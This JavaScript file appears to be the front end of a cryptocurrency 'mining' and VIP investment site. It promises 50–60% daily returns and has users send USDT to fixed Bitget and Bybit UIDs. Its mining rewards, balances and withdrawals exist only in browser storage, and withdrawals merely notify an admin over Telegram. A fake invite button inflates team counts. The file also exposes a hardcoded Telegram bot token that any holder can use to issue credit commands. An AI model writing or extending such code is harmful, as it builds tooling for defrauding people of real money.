/* ============================================
   script.js — FULL manual upgrade with Telegram command polling
   - VIP1 = 1 USDT -> 0.50 USDT/day
   - VIP2 = 10 USDT -> 6.00 USDT/day
   - Admin commands via Telegram bot:
       /vip1 <accountId>
       /vip2 <accountId>
       /send <accountId> <amount>
   - Each client polls bot getUpdates and applies commands only if target accountId matches its own
   - Persistent localStorage, mining timer, convert, withdraw, VIP accrual
   ============================================ */

/* ---------------- TELEGRAM CONFIG (use your provided token & admin id) ---------------- */
const TELEGRAM_BOT_TOKEN = "7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI"; // your provided token
const TELEGRAM_POLL_INTERVAL_MS = 5000; // poll every 5s
const TELEGRAM_GETUPDATES_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;

/* ---------------- APP CONSTANTS ---------------- */
const STORAGE_KEY = "trx_vip_telegram_v2";
const TRX_PRICE_USDT = 0.0006;
const REWARD_TRX = 5;
const MINING_DURATION_MS = 2 * 60 * 60 * 1000; // 2 hours

/* VIP settings: buy price and daily reward */
const VIP_PLANS = {
  vip1: { buy: 1.00, daily: 0.50 },
  vip2: { buy: 10.00, daily: 6.00 }
};

/* ---------------- Storage helpers ---------------- */
function loadState(){ try{ const j = localStorage.getItem(STORAGE_KEY); return j?JSON.parse(j):null } catch(e){ console.error('loadState err', e); return null; } }
function saveState(s){ try{ localStorage.setItem(STORAGE_KEY, JSON.stringify(s)); } catch(e){ console.error('saveState err', e); } }

/* ---------------- Initial state ---------------- */
let state = loadState() || {
  accountId: Math.floor(100000 + Math.random()*900000), // numeric account ID (6 digits)
  refCode: (Math.random().toString(36).slice(2,9)).toUpperCase(),
  trx: 20,
  usdt: parseFloat((20 * TRX_PRICE_USDT).toFixed(6)),
  teamCount: 0,
  miningActive: false,
  miningEnd: null,
  miningHistory: [],
  withdrawRequests: [],
  vipRequests: [],
  vip: { active:false, plan:null, activatedAt:null, lastClaim:null },
  telegramOffset: 0 // for getUpdates offset
};
saveState(state);

/* ---------------- DOM references ---------------- */
const navBtns = Array.from(document.querySelectorAll('.nav-btn'));
const pages = Array.from(document.querySelectorAll('.page'));
const refCodeEl = document.getElementById('refInput') || document.getElementById('refCode');
const copyRefBtn = document.getElementById('copyRefBtn');
const copyRefBtn2 = document.getElementById('copyRefBtn2');
const teamCountEl = document.getElementById('teamCount');

const trxAmountEl = document.getElementById('trxAmount');
const usdtAmountEl = document.getElementById('usdtAmount');
const accountIdEl = document.getElementById('accountId');
const vipStatusEl = document.getElementById('vipStatus');

const mineActionBtn = document.getElementById('mineActionBtn');
const mineStatusEl = document.getElementById('mineStatus');
const progressInner = document.getElementById('progressInner');
const progressTimer = document.getElementById('progressTimer');
const mineMessage = document.getElementById('mineMessage');
const miningHistoryEl = document.getElementById('miningHistory');

const priceLabel = document.getElementById('priceLabel');
const cycleLabel = document.getElementById('cycleLabel');
const rewardLabel = document.getElementById('rewardLabel');

const convertInput = document.getElementById('convertInput');
const convertDo = document.getElementById('convertDo');
const convertResult = document.getElementById('convertResult');

const withdrawMethod = document.getElementById('withdrawMethod');
const withdrawUID = document.getElementById('withdrawUID');
const withdrawAmount = document.getElementById('withdrawAmount');
const submitWithdraw = document.getElementById('submitWithdraw');
const withdrawMsg = document.getElementById('withdrawMsg');

const buyVipBtns = Array.from(document.querySelectorAll('.buyVipBtn'));
const vipForm = document.getElementById('vipForm');
const vipFormTitle = document.getElementById('vipFormTitle');
const vipExchange = document.getElementById('vipExchange') || document.getElementById('vipExchange');
const vipSenderUID = document.getElementById('vipSenderUID');
const vipMemo = document.getElementById('vipMemo');
const vipFile = document.getElementById('vipFile');
const vipSubmit = document.getElementById('vipSubmit');
const vipCancel = document.getElementById('vipCancel');
const vipMsg = document.getElementById('vipMsg');

const bitgetUIDEl = document.getElementById('bitgetUID');
const bybitUIDEl = document.getElementById('bybitUID');
if(bitgetUIDEl) bitgetUIDEl.innerText = "9879164714";
if(bybitUIDEl) bybitUIDEl.innerText = "269645993";

/* ---------------- NAVIGATION (keep pages separate) ---------------- */
navBtns.forEach(btn=>{
  btn.addEventListener('click', ()=>{
    navBtns.forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const target = btn.dataset.target;
    pages.forEach(p=>p.classList.remove('active'));
    const el = document.getElementById(target) || document.getElementById(`page-${target}`);
    if(el) el.classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });
});
Array.from(document.querySelectorAll('.bottom-nav .nav-btn')).forEach(b=>{
  b.addEventListener('click', ()=>{
    const t = b.dataset.target;
    const topBtn = Array.from(navBtns).find(n => n.dataset.target === t);
    if(topBtn) topBtn.click();
  });
});

/* ---------------- REF & TEAM ---------------- */
if(refCodeEl) refCodeEl.value = state.refCode;
if(copyRefBtn) copyRefBtn.addEventListener('click', ()=> navigator.clipboard.writeText(state.refCode).then(()=> alert('Referral code copied')));
if(copyRefBtn2) copyRefBtn2.addEventListener('click', ()=> navigator.clipboard.writeText(state.refCode).then(()=> alert('Referral code copied')));
document.getElementById('fakeInviteBtn')?.addEventListener('click', ()=>{
  state.teamCount = (parseInt(state.teamCount) || 0) + 1;
  saveState(state);
  renderAll();
});

/* ---------------- RENDER ---------------- */
let miningInterval = null;
function renderAll(){
  if(trxAmountEl) trxAmountEl.innerText = parseFloat(state.trx).toFixed(6);
  if(usdtAmountEl) usdtAmountEl.innerText = parseFloat(state.usdt).toFixed(6);
  if(accountIdEl) accountIdEl.innerText = state.accountId;
  if(teamCountEl) teamCountEl.innerText = state.teamCount;
  if(vipStatusEl) vipStatusEl.innerText = state.vip.active ? `${state.vip.plan.toUpperCase()} (since ${new Date(state.vip.activatedAt).toLocaleString()})` : 'None';
  if(priceLabel) priceLabel.innerText = TRX_PRICE_USDT.toString();
  if(cycleLabel) cycleLabel.innerText = `Cycle: ${MINING_DURATION_MS/(1000*60*60)} hours`;
  if(rewardLabel) rewardLabel.innerText = `Reward: ${REWARD_TRX} TRX`;
  renderHistory();
  renderMiningUI();
  saveState(state);
}
function renderHistory(){
  if(!miningHistoryEl) return;
  miningHistoryEl.innerHTML = '';
  (state.miningHistory || []).slice().reverse().forEach(h=>{
    const li = document.createElement('li');
    li.innerText = `${h.text} — ${new Date(h.time).toLocaleString()}`;
    miningHistoryEl.appendChild(li);
  });
}

/* ---------------- MINING UI & LOGIC (persistent) ---------------- */
function renderMiningUI(){
  if(state.miningActive && state.miningEnd){
    const remaining = Math.max(0, state.miningEnd - Date.now());
    if(remaining <= 0){
      progressInner.style.width = '100%';
      progressTimer.innerText = 'Ready to claim';
      mineActionBtn.innerText = `Collect (${REWARD_TRX} TRX)`;
      mineActionBtn.disabled = false;
      mineStatusEl.innerText = 'Completed';
      mineActionBtn.onclick = collectReward;
      toggleCoinSpin(false);
      if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
    } else {
      const pct = Math.max(0, Math.min(100, ((MINING_DURATION_MS - remaining) / MINING_DURATION_MS) * 100));
      progressInner.style.width = pct + '%';
      const sec = Math.floor(remaining / 1000);
      progressTimer.innerText = `Time: ${formatSecondsToHMS(sec)}`;
      mineActionBtn.innerText = 'Mining...';
      mineActionBtn.disabled = true;
      mineStatusEl.innerText = 'Mining';
      mineActionBtn.onclick = null;
      toggleCoinSpin(true);
      if(!miningInterval){
        miningInterval = setInterval(renderMiningUI, 1000);
      }
    }
  } else {
    progressInner.style.width = '0%';
    progressTimer.innerText = 'Not started';
    mineActionBtn.innerText = 'Start Mining';
    mineActionBtn.disabled = false;
    mineStatusEl.innerText = 'Idle';
    mineActionBtn.onclick = startMining;
    toggleCoinSpin(false);
    if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
  }
}
function startMining(){
  if(state.miningActive) return;
  state.miningActive = true;
  state.miningEnd = Date.now() + MINING_DURATION_MS;
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: 'Mining started', time: Date.now() });
  mineMessage.innerText = 'Mining started — resume after refresh';
  saveState(state);
  renderAll();
}
function collectReward(){
  state.miningActive = false;
  state.miningEnd = null;
  state.trx = parseFloat((state.trx + REWARD_TRX).toFixed(6));
  state.usdt = parseFloat((state.trx * TRX_PRICE_USDT).toFixed(6));
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: `Collected +${REWARD_TRX} TRX`, time: Date.now() });
  mineMessage.innerText = `Collected ${REWARD_TRX} TRX`;
  // notify admin
  sendTelegramMessage(`[CLAIM] account:${state.accountId} +${REWARD_TRX} TRX`);
  saveState(state);
  renderAll();
}
function formatSecondsToHMS(sec){
  const h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = sec%60;
  return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}
function toggleCoinSpin(on){
  const coin = document.querySelector('.coin-outer');
  if(!coin) return;
  if(on) coin.classList.add('spin-active'); else coin.classList.remove('spin-active');
}

/* ---------------- CONVERT ---------------- */
convertDo && convertDo.addEventListener('click', ()=>{
  const v = parseFloat(convertInput.value || 0);
  if(!v || v <= 0){ alert('Enter TRX amount'); return; }
  if(v > state.trx){ alert('Not enough TRX'); return; }
  const converted = parseFloat((v * TRX_PRICE_USDT).toFixed(6));
  state.trx = parseFloat((state.trx - v).toFixed(6));
  state.usdt = parseFloat((state.usdt + converted).toFixed(6));
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: `Converted ${v} TRX → ${converted} USDT`, time: Date.now() });
  convertResult.innerText = `Converted ${v} TRX → ${converted} USDT`;
  sendTelegramMessage(`[CONVERT] account:${state.accountId} ${v} TRX → ${converted} USDT`);
  saveState(state);
  renderAll();
});

/* ---------------- WITHDRAW ---------------- */
submitWithdraw && submitWithdraw.addEventListener('click', ()=>{
  const method = withdrawMethod.value;
  const uid = withdrawUID.value.trim();
  const amount = parseFloat(withdrawAmount.value || 0);
  if(!uid){ alert('Enter UID'); return; }
  if(isNaN(amount) || amount < 0.01){ alert('Amount must be >= 0.01'); return; }
  if(amount > state.usdt){ alert('Not enough USDT'); return; }
  state.usdt = parseFloat((state.usdt - amount).toFixed(6));
  state.withdrawRequests = state.withdrawRequests || [];
  const req = { account: state.accountId, method, uid, amount, time: Date.now() };
  state.withdrawRequests.push(req);
  withdrawMsg.innerText = `Withdraw submitted: ${amount.toFixed(6)} USDT → ${method} (${uid})`;
  // notify admin
  sendTelegramMessage(`[WITHDRAW] account:${state.accountId} method:${method} uid:${uid} amount:${amount.toFixed(6)} USDT`);
  saveState(state);
  renderAll();
});

/* ---------------- VIP BUY (client submits proof; admin will manually activate or can use /vip command) ---------------- */
let selectedVipPlan = null;
buyVipBtns.forEach(b=>{
  b.addEventListener('click', ()=>{
    selectedVipPlan = b.closest('.vip-card').dataset.plan;
    vipForm.classList.remove('hidden');
    vipFormTitle.innerText = (selectedVipPlan === 'vip1' ? 'VIP 1 — 1 USDT' : 'VIP 2 — 10 USDT');
    vipMsg.innerText = `Send ${selectedVipPlan === 'vip1' ? '1.00' : '10.00'} USDT to Bitget (9879164714) or Bybit (269645993), upload proof and submit.`;
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });
});
vipCancel && vipCancel.addEventListener('click', ()=>{ selectedVipPlan = null; vipForm.classList.add('hidden'); vipMsg.innerText = ''; });
vipSubmit && vipSubmit.addEventListener('click', ()=>{
  const exch = vipExchange.value;
  const sender = vipSenderUID.value.trim();
  const memo = vipMemo.value.trim();
  const file = vipFile.files[0];
  if(!selectedVipPlan){ alert('Choose VIP plan'); return; }
  if(!sender || !memo){ alert('Enter sender UID and memo'); return; }
  state.vipRequests = state.vipRequests || [];
  const req = { plan:selectedVipPlan, account: state.accountId, exchange: exch, sender, memo, time: Date.now() };
  state.vipRequests.push(req);
  vipMsg.innerText = 'VIP request submitted — admin will review within 24h (or activate by telegram command).';
  // save proof locally (base64)
  if(file){
    const reader = new FileReader();
    reader.onload = e => { state[`vip_proof_${Date.now()}`] = e.target.result; saveState(state); };
    reader.readAsDataURL(file);
  }
  sendTelegramMessage(`[VIP REQUEST] account:${state.accountId} plan:${selectedVipPlan} exch:${exch} sender:${sender} memo:${memo}`);
  saveState(state);
  vipForm.classList.add('hidden');
  selectedVipPlan = null;
  renderAll();
});

/* ---------------- VIP accrual: claim daily rewards automatically ---------------- */
/* We'll accumulate rewards based on days passed since lastClaim.
   For every full day (24h) since lastClaim, add plan.daily * days to state.usdt and update lastClaim.
   This function runs on init and on an interval (hourly).
*/
function accrueVipRewards(){
  if(!state.vip || !state.vip.active || !state.vip.plan) return;
  const plan = state.vip.plan;
  const daily = VIP_PLANS[plan].daily;
  const last = state.vip.lastClaim ? state.vip.lastClaim : state.vip.activatedAt;
  const lastMs = last ? new Date(last).getTime() : Date.now();
  const now = Date.now();
  const diffDays = Math.floor((now - lastMs) / (1000 * 60 * 60 * 24)); // full days
  if(diffDays >= 1){
    const amount = parseFloat((diffDays * daily).toFixed(6));
    state.usdt = parseFloat((state.usdt + amount).toFixed(6));
    state.vip.lastClaim = Date.now();
    state.miningHistory = state.miningHistory || [];
    state.miningHistory.push({ text: `VIP ${plan.toUpperCase()} daily credited +${amount} USDT`, time: Date.now() });
    // notify admin
    sendTelegramMessage(`[VIP CREDIT] account:${state.accountId} plan:${plan} amount:${amount} USDT`);
    saveState(state);
    renderAll();
  }
}
/* run accrual every hour */
setInterval(accrueVipRewards, 1000 * 60 * 60);

/* ---------------- TELEGRAM POLLING: getUpdates & command processing ---------------- */
/* This client will poll bot getUpdates. For each update text, parse commands:
   /vip1 <accountId>
   /vip2 <accountId>
   /send <accountId> <amount>
   When a command targets THIS client (state.accountId), apply action and send confirmation reply (via sendTelegramMessage).
*/
let tgPolling = null;
function startTelegramPolling(){
  // restore offset from state
  let offset = state.telegramOffset || 0;
  async function poll(){
    try{
      // Use getUpdates with offset to only fetch new messages
      const url = `${TELEGRAM_GETUPDATES_URL}?offset=${offset}&timeout=0`;
      const res = await fetch(url);
      // If CORS blocks, this will throw or res.ok false; handle in catch
      const j = await res.json();
      if(!j) return;
      if(Array.isArray(j.result) && j.result.length){
        for(const upd of j.result){
          offset = Math.max(offset, (upd.update_id || 0) + 1);
          // safe store offset
          state.telegramOffset = offset;
          saveState(state);
          // extract message text & from
          const msg = upd.message || upd.channel_post || upd.edited_message;
          if(!msg || !msg.text) continue;
          const text = String(msg.text || '').trim();
          const from = msg.from ? `${msg.from.id}:${msg.from.username||''}` : 'unknown';
          console.log('tg msg:', text, 'from', from);
          // process commands
          await processTelegramCommand(text, from);
        }
      }
    }catch(err){
      console.error('tg poll err', err);
      // If CORS error or network, inform user in mineMessage (non-blocking)
      if(mineMessage) mineMessage.innerText = 'Telegram poll error (check console).';
      // do not stop polling; will try again next interval
    }
  }
  // initial poll immediately
  poll();
  tgPolling = setInterval(poll, TELEGRAM_POLL_INTERVAL_MS);
}
function stopTelegramPolling(){
  if(tgPolling) clearInterval(tgPolling);
  tgPolling = null;
}

/* parse commands and apply if target matches this client's accountId */
async function processTelegramCommand(text, from){
  // normalize and split
  const parts = text.split(/\s+/).filter(Boolean);
  if(parts.length === 0) return;
  const cmd = parts[0].toLowerCase();

  // /vip1 <accountId>
  if(cmd === '/vip1' && parts.length >= 2){
    const target = parts[1].trim();
    if(String(target) === String(state.accountId)){
      // activate VIP1
      activateVip('vip1', 'telegram');
      sendTelegramMessage(`[VIP ACTIVATED] account:${state.accountId} plan:vip1 (activated by admin)`);
    } else {
      // not for this client; ignore
      console.log('vip1 for', target, 'not this client', state.accountId);
    }
    return;
  }

  // /vip2 <accountId>
  if(cmd === '/vip2' && parts.length >= 2){
    const target = parts[1].trim();
    if(String(target) === String(state.accountId)){
      activateVip('vip2', 'telegram');
      sendTelegramMessage(`[VIP ACTIVATED] account:${state.accountId} plan:vip2 (activated by admin)`);
    } else {
      console.log('vip2 for', target, 'not this client', state.accountId);
    }
    return;
  }

  // /send <accountId> <amount>
  if(cmd === '/send' && parts.length >= 3){
    const target = parts[1].trim();
    const amount = parseFloat(parts[2]);
    if(isNaN(amount) || amount <= 0){
      console.log('invalid send amount', parts[2]);
      return;
    }
    if(String(target) === String(state.accountId)){
      // credit the account
      state.usdt = parseFloat((state.usdt + amount).toFixed(6));
      state.miningHistory = state.miningHistory || [];
      state.miningHistory.push({ text: `Admin /send credited +${amount} USDT`, time: Date.now() });
      saveState(state);
      renderAll();
      sendTelegramMessage(`[SEND CONFIRM] credited account:${state.accountId} +${amount} USDT`);
    } else {
      console.log('send for', target, 'not this client', state.accountId);
    }
    return;
  }

  // additional: admin can query account with /status <accountId> (optional)
  if(cmd === '/status' && parts.length >= 2){
    const target = parts[1].trim();
    if(String(target) === String(state.accountId)){
      const reply = `STATUS account:${state.accountId}\nTRX:${state.trx}\nUSDT:${state.usdt}\nVIP:${state.vip.active?state.vip.plan:'none'}`;
      sendTelegramMessage(reply);
    }
    return;
  }

  // ignore other messages
}

/* ---------------- VIP activation local function ---------------- */
function activateVip(plan, source){
  if(!VIP_PLANS[plan]) return;
  state.vip = state.vip || {};
  state.vip.active = true;
  state.vip.plan = plan;
  state.vip.activatedAt = Date.now();
  state.vip.lastClaim = Date.now();
  // optionally deduct buy price from user usdt if they paid externally via manual method
  // For admin-activated flows we do not deduct; if client purchased via site, admin will confirm
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: `VIP ${plan.toUpperCase()} activated (${source})`, time: Date.now() });
  saveState(state);
  renderAll();
}

/* ---------------- Send Telegram message helper ---------------- */
/* Note: direct browser -> Telegram calls may fail due to CORS. If blocked, check console.
   This function still attempts fetch; errors are logged.
*/
function sendTelegramMessage(text){
  if(!TELEGRAM_BOT_TOKEN){
    console.log('No TG token set:', text);
    return;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  // Best-effort: send a message to bot owner/admin via bot (note: this posts as bot to given chat id)
  // If ADMIN_CHAT_ID isn't provided or valid, the bot will return error.
  const ADMIN_CHAT_ID = "7417215529"; // admin chat id for notifications (kept as constant)
  fetch(url, {
    method:'POST',
    headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text, parse_mode: 'HTML' })
  }).then(r=>r.json()).then(j=>{
    console.log('telegram send response', j);
    if(!j.ok){
      console.warn('Telegram send failed', j);
    }
  }).catch(e=>{
    console.error('telegram fetch error', e);
  });
}

/* ---------------- START POLLING & INIT ---------------- */
(function init(){
  // numeric convert
  state.trx = parseFloat(state.trx);
  state.usdt = parseFloat(state.usdt);
  // start polling Telegram for admin commands
  startTelegramPolling();
  // run accrual once on init
  accrueVipRewards();
  // periodic accrual every hour already set earlier
  renderAll();
})();

/* ---------------- End of script.js ---------------- */
